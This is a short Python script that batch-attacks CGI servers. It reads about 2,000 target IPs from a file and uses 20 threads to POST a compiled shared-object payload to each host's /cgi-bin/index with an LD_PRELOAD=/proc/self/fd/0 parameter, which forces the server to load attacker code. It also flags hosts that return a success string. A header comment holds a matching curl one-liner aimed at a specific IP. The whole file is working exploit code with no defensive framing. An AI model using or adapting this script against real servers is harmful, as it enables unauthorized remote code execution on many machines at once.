# coding:utf-8

# payload = "d/0" -i "curl -X POST --data-binary @payload.so "http://173.18.202.66:8080/cgi-bin/index?LD_PRELOAD=/proc/self/f

import requests
import threading
import queue

event = threading.Event()
event.set()
q_ip = queue.Queue(-1)


class multi_thread(threading.Thread):

    def __init__(self,num,q_ip):
        threading.Thread.__init__(self)
        self.num = num
        self.q_ip = q_ip


    def run(self):
        while event.is_set():
            if self.q_ip.empty():
                break
            else:
                ip = self.q_ip.get()
                self.attack(self.num,ip)

    def attack(self,num,ip):
        url = "http://{}/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0".format(ip)
        #print(url)
        try:
            res = requests.post(url=url, data=exp)
            # print(res.text)
            print(res.status_code)
            if "Hello: World!" in res.text:
                print("[+]IP:{}>>>>>OK".format(ip))
        except Exception as e:
            print(e)



def run_thread(thread_num,q_ip):
    threads = []
    for num in range(1,thread_num+1):
        t = multi_thread(num,q_ip)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

# 获取IP
def get_ip(ipLog):
    with open('{}'.format(ipLog),'r') as f:
        for ip in f:
            ip = ip.strip()
            q_ip.put(ip)
        return q_ip

# 获取payload
def get_exp(filepath):
    with open("{}".format(filepath),"rb") as f:
        content = f.read()
        return content

if __name__ == '__main__':
    q_ip = get_ip("ip_2000.txt")
    print(q_ip.qsize())
    thread_num = 20
    exp = get_exp("payload.so")
    print(type(exp))
    run_thread(thread_num,q_ip)